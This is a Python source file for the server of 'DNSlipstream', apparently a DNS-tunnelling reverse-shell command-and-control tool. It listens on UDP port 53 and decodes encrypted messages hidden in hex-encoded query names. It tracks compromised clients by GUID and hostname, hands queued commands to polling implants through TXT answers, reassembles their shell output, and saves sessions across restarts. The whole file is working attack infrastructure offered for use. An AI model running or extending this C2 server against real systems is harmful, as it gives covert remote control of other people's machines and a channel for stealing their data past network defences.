# cmd/server/serv.py
import sys
import os
import time
import threading
import signal
from collections import defaultdict
from datetime import datetime
import binascii


sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))


from dnslib import DNSRecord, DNSHeader, RR, TXT, QTYPE, A, AAAA, MX, CNAME
from dnslib.server import DNSServer, BaseResolver, DNSLogger


from lib.crypto.symetric import open_sealed
from lib.protocol import comm_pb2
from lib.logging import printf, println
from cmd.server import cli
from lib.persistence.session_store import SessionStore, SessionRecovery


# Try to import embedded config first
try:
    from lib.config_embedded import ENCRYPTION_KEY as EMBEDDED_KEY
    from lib.config_embedded import DOMAIN_NAME as EMBEDDED_DOMAIN
except ImportError:
    EMBEDDED_KEY = None
    EMBEDDED_DOMAIN = None


# Get from environment or embedded config
TARGET_DOMAIN = EMBEDDED_DOMAIN or 'c.example.com'
ENCRYPTION_KEY = EMBEDDED_KEY or ''


# Validate
if not ENCRYPTION_KEY:
    print("ERROR: ENCRYPTION_KEY not set!")
    print("\nOptions:")
    print("  1. Build with embedded key:")
    print("     python build_binaries.py all --domain c.example.com")
    print("  2. Or set environment variable:")
    print("     export ENCRYPTION_KEY=$(python3 -c 'from os import urandom; print(urandom(32).hex())')")
    sys.exit(1)


if len(ENCRYPTION_KEY) != 64:
    print(f"ERROR: Invalid key length: {len(ENCRYPTION_KEY)} (expected 64)")
    sys.exit(1)


print(f"=== DNSlipstream Server ===")


# Share state with CLI module
cli.encryption_key = ENCRYPTION_KEY
cli.target_domain = TARGET_DOMAIN
cli.current_session = None
cli.console_buffer = {}
cli.packet_queue = {}
cli.sessions_map = {}


# Initialize session store
session_store = SessionStore()


# Statistics tracking
server_stats = {
    'queries_received': 0,
    'queries_by_type': defaultdict(int),
    'clients_seen': set(),
    'start_time': time.time()
}
stats_lock = threading.Lock()



class ClientInfo:
    """Store client session information."""
    
    def __init__(self):
        self.hostname = "unknown"
        self.heartbeat = time.time()
        self.lock = threading.Lock()
        self.conn = {}  # {chunk_id: ConnData}
        self.stats = {
            'packets_received': 0,
            'bytes_received': 0,
            'last_seen': time.time()
        }



class ConnData:
    """Store connection chunk data."""
    
    def __init__(self, chunk_size):
        self.chunk_size = chunk_size
        self.nonce = None
        self.packets = {}  # {chunk_num: data}



class PollTemporaryData:
    """Temporary storage for poll queries."""
    
    def __init__(self, data):
        self.lastseen = time.time()
        self.data = data



# Global caches
poll_cache = {}



class ShellResolver(BaseResolver):
    """
    DNS resolver for Shell protocol with multi-channel support.
    Currently handles all record types but responds with TXT.
    Ready for full multi-channel implementation.
    """
    
    def resolve(self, request, handler):
        """Handle DNS request."""
        reply = request.reply()
        
        # Track statistics
        with stats_lock:
            server_stats['queries_received'] += 1
        
        # Process each question in the request
        for question in request.questions:
            qname = str(question.qname)
            qtype = question.qtype
            
            # Track query type
            with stats_lock:
                qtype_name = QTYPE[qtype] if qtype in QTYPE.reverse else str(qtype)
                server_stats['queries_by_type'][qtype_name] += 1
            
            # Handle different query types (all respond with TXT for now)
            if qtype == QTYPE.TXT:
                answer = self.parse_query(qname, 'TXT')
                reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(answer)))
            
            elif qtype == QTYPE.A:
                # A record query - parse and respond with TXT for now
                answer = self.parse_query(qname, 'A')
                # TODO: When implementing full multi-channel, respond with A record
                reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(answer)))
            
            elif qtype == QTYPE.AAAA:
                # AAAA record query - parse and respond with TXT for now
                answer = self.parse_query(qname, 'AAAA')
                # TODO: When implementing full multi-channel, respond with AAAA record
                reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(answer)))
            
            elif qtype == QTYPE.MX:
                # MX record query - parse and respond with TXT for now
                answer = self.parse_query(qname, 'MX')
                # TODO: When implementing full multi-channel, respond with MX record
                reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(answer)))
            
            elif qtype == QTYPE.CNAME:
                # CNAME record query - parse and respond with TXT for now
                answer = self.parse_query(qname, 'CNAME')
                # TODO: When implementing full multi-channel, respond with CNAME record
                reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(answer)))
            
            else:
                # Unknown query type - respond with empty TXT
                reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("-")))
        
        return reply
    
    def parse_query(self, qname, record_type):
        """
        Parse and process DNS query.
        
        Args:
            qname: Query name
            record_type: Type of DNS record (TXT, A, AAAA, MX, CNAME)
        
        Returns:
            Response string
        """
        try:
            # Strip the target domain and all dots
            data_packet = qname.replace(TARGET_DOMAIN, '').replace('.', '').rstrip('.')
            
            # Hex-decode the packet
            try:
                data_packet_raw = binascii.unhexlify(data_packet)
            except (binascii.Error, ValueError) as e:
                return "-"
            
            # Check minimum packet size (24 bytes for nonce)
            if len(data_packet_raw) < 24:
                return "-"
            
            # Decrypt and authenticate the packet
            nonce = data_packet_raw[:24]
            ciphertext = data_packet_raw[24:]
            output, valid = open_sealed(ciphertext, nonce, ENCRYPTION_KEY)
            
            if not valid:
                return "-"
            
            # Parse protobuf message
            message = comm_pb2.Message()
            try:
                message.ParseFromString(output)
            except Exception as e:
                return "-"
            
            # Get client GUID
            client_guid = binascii.hexlify(message.clientguid).decode('ascii')
            
            if not client_guid:
                return "-"
            
            # Track unique clients
            with stats_lock:
                server_stats['clients_seen'].add(client_guid)
            
            # Check if session exists, create if new
            if client_guid not in cli.sessions_map:
                print(f"\r\nNew session : {client_guid}\nshell >>> ", end='', flush=True)
                cli.sessions_map[client_guid] = ClientInfo()
                cli.console_buffer[client_guid] = []
                cli.packet_queue[client_guid] = []
            
            session = cli.sessions_map[client_guid]
            
            # Lock session to avoid race conditions
            with session.lock:
                # Update heartbeat and stats
                session.heartbeat = time.time()
                session.stats['last_seen'] = time.time()
                session.stats['packets_received'] += 1
                
                # Process message based on type
                if message.HasField('pollquery'):
                    return self.handle_poll_query(client_guid, data_packet_raw)
                
                elif message.HasField('infopacket'):
                    hostname = message.infopacket.hostname.decode('utf-8', errors='ignore')
                    old_hostname = session.hostname
                    session.hostname = hostname
                    
                    # Only log if hostname changed or is new
                    if old_hostname != hostname:
                        printf(f"[{client_guid[:8]}] Host identified: {hostname}\n")
                
                elif message.HasField('chunkstart'):
                    self.handle_chunk_start(session, message.chunkstart)
                
                elif message.HasField('chunkdata'):
                    self.handle_chunk_data(session, message.chunkdata, client_guid)
        
        except Exception as e:
            pass
        
        return "-"
    
    def handle_poll_query(self, client_guid, data_packet_raw):
        """Handle poll query from client."""
        # Check cache for duplicate queries
        cache_key = data_packet_raw.hex()
        if cache_key in poll_cache:
            return poll_cache[cache_key].data
        
        # Initialize queue if not exists
        if client_guid not in cli.packet_queue:
            cli.packet_queue[client_guid] = []
        
        # Check if we have data to send
        if len(cli.packet_queue[client_guid]) > 0:
            answer = cli.packet_queue[client_guid][0]
            # Cache the answer
            poll_cache[cache_key] = PollTemporaryData(answer)
            # Dequeue
            cli.packet_queue[client_guid] = cli.packet_queue[client_guid][1:]
            return answer
        
        return "-"
    
    def handle_chunk_start(self, session, chunkstart):
        """Handle chunk start message."""
        chunk_id = chunkstart.chunkid
        
        # Ignore duplicates
        if chunk_id in session.conn:
            return
        
        # Allocate new connection data
        session.conn[chunk_id] = ConnData(chunkstart.chunksize)
    
    def handle_chunk_data(self, session, chunkdata, client_guid):
        """Handle chunk data message."""
        chunk_id = chunkdata.chunkid
        
        # Get connection data
        if chunk_id not in session.conn:
            return
        
        connection = session.conn[chunk_id]
        chunk_num = chunkdata.chunknum
        
        # Ignore duplicates
        if chunk_num in connection.packets:
            return
        
        # Store packet
        connection.packets[chunk_num] = chunkdata.packet
        
        # Update stats
        session.stats['bytes_received'] += len(chunkdata.packet)
        
        # Check if all packets received
        if len(connection.packets) == connection.chunk_size:
            # Rebuild data in order
            data_parts = []
            for i in range(connection.chunk_size):
                if i in connection.packets:
                    data_parts.append(connection.packets[i])
            
            complete_data = b''.join(data_parts)
            
            # Output to console or buffer
            if cli.current_session == client_guid:
                print(complete_data.decode('utf-8', errors='ignore'), end='')
            else:
                if client_guid not in cli.console_buffer:
                    cli.console_buffer[client_guid] = []
                cli.console_buffer[client_guid].append(complete_data.decode('utf-8', errors='ignore'))
            
            # Clean up connection
            del session.conn[chunk_id]



def timeout_checker():
    """Check for timed-out sessions."""
    while True:
        time.sleep(1)
        now = time.time()
        
        # Check sessions
        sessions_to_remove = []
        for client_guid, session in cli.sessions_map.items():
            if session.heartbeat + 30 < now:
                printf(f"Client timed out [{client_guid[:8]}].\n")
                sessions_to_remove.append(client_guid)
        
        # Remove timed out sessions
        for client_guid in sessions_to_remove:
            del cli.sessions_map[client_guid]
            if client_guid in cli.packet_queue:
                del cli.packet_queue[client_guid]
            if client_guid in cli.console_buffer:
                del cli.console_buffer[client_guid]



def poll_cache_cleaner():
    """Clean old poll cache entries."""
    while True:
        time.sleep(1)
        now = time.time()
        
        # Check cache entries
        cache_to_remove = []
        for poll_data, cache in poll_cache.items():
            if cache.lastseen + 10 < now:
                cache_to_remove.append(poll_data)
        
        # Remove old entries
        for poll_data in cache_to_remove:
            del poll_cache[poll_data]



def load_previous_sessions():
    """Load sessions from previous server run."""
    print("[*] Checking for previous sessions...")
    
    sessions_data, console_buffer, packet_queue = session_store.load_sessions()
    
    if not sessions_data:
        print("[*] No previous sessions found")
        return
    
    # Cleanup stale sessions (older than 1 hour)
    sessions_data = SessionRecovery.cleanup_stale_sessions(sessions_data, max_age=3600)
    
    if not sessions_data:
        print("[*] No valid sessions to restore")
        return
    
    # Restore sessions
    restored_count = 0
    for client_guid, data in sessions_data.items():
        session = SessionRecovery.restore_session(client_guid, data, ClientInfo)
        cli.sessions_map[client_guid] = session
        restored_count += 1
        
        print(f"[+] Restored session: {client_guid[:16]}... ({data['hostname']})")
    
    # Restore buffers and queues
    cli.console_buffer.update(console_buffer)
    cli.packet_queue.update(packet_queue)
    
    print(f"[+] Restored {restored_count} sessions from previous run\n")



def save_all_sessions():
    """Save all current sessions to disk."""
    success, msg = session_store.save_sessions(
        cli.sessions_map,
        cli.console_buffer,
        cli.packet_queue
    )
    print(f"[*] {msg}")
    return success, msg



def get_current_sessions():
    """Get current sessions for auto-save."""
    return cli.sessions_map, cli.console_buffer, cli.packet_queue



def print_stats():
    """Print server statistics."""
    with stats_lock:
        uptime = time.time() - server_stats['start_time']
        hours = int(uptime // 3600)
        minutes = int((uptime % 3600) // 60)
        seconds = int(uptime % 60)
        
        print("\n=== Server Statistics ===")
        print(f"Uptime: {hours}h {minutes}m {seconds}s")
        print(f"Total Queries: {server_stats['queries_received']}")
        print(f"Unique Clients: {len(server_stats['clients_seen'])}")
        print(f"Active Sessions: {len(cli.sessions_map)}")
        print("\nQueries by Type:")
        for qtype, count in sorted(server_stats['queries_by_type'].items()):
            print(f"  {qtype}: {count}")
        print("=" * 25 + "\n")



def signal_handler(sig, frame):
    """Handle graceful shutdown."""
    print("\n[*] Shutting down gracefully...")
    print_stats()
    save_all_sessions()
    sys.exit(0)



def main():
    """Main server function."""
    
    if not TARGET_DOMAIN or not ENCRYPTION_KEY:
        print("Error: TARGET_DOMAIN and ENCRYPTION_KEY must be set")
        sys.exit(1)
    
    print(f"Starting shell Server")
    print(f"Target Domain: {TARGET_DOMAIN}")
    print(f"Listening on UDP port 53")
    print(f"Multi-Channel: Ready (TXT fallback mode)\n")
    
    # Load previous sessions
    load_previous_sessions()
    
    # Start auto-save thread (every 30 seconds)
    print("[*] Starting auto-save (every 30 seconds)")
    
    session_store.auto_save_loop(get_current_sessions, interval=30)
    
    # Start DNS server in background thread
    resolver = ShellResolver()
    error_logger = DNSLogger(log="error", prefix=False)
    
    dns_server = DNSServer(resolver, port=53, address="0.0.0.0", logger=error_logger)
    
    dns_thread = threading.Thread(target=dns_server.start, daemon=True)
    dns_thread.start()
    
    # Start timeout checker
    timeout_thread = threading.Thread(target=timeout_checker, daemon=True)
    timeout_thread.start()
    
    # Start poll cache cleaner
    cache_thread = threading.Thread(target=poll_cache_cleaner, daemon=True)
    cache_thread.start()
    
    # Register signal handlers for graceful shutdown
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Run CLI
    cli.run_cli()



if __name__ == "__main__":
    main()
